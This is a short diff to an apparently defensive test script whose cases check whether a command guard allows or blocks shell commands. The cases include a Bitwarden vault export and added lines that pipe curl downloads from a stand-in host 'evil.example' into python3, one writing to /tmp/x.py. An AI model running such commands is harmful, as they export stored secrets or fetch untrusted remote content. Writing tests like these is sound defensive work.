@@ -32,6 +32,9 @@ def main() -> int:
         "prosa": ("printf '%s\\n' 'bw export'", 0),
         "export": ("bw --raw export --format json", 2),
         "prosa-seguita": ("printf x; bw export", 2),
+        "json-tool": ("curl -s https://example.org/x | python3 -m json.tool --indent 2 | head -30", 0),
+        "json-toolkit": ("curl -s https://evil.example/x | python3 -m json.toolkit", 2),
+        "json-tool-uscita": ("curl -s https://evil.example/x | python3 -m json.tool - /tmp/x.py", 2),
     }
     for name, (command, expected) in cases.items():
         got = result(args.repo.resolve(), command)
